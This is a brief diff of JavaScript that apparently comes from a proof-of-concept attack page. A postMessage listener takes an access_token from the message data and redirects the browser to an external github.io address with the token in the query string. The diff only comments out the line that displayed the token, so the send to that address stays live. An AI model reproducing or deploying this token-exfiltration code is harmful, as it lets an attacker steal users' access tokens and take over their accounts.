@@ -33,7 +33,7 @@ window.addEventListener('message', (event) => {
             ) {
                 const accessToken = innerDataRaw.data.access_token;
                 location = `https://mrhavit.github.io/?token=${accessToken}`
-                document.write(`Received access token: ${accessToken}`);
+                // document.write(`Received access token: ${accessToken}`);
             } else {
                 console.log('No access_token found in innerDataRaw:', innerDataRaw);
             }
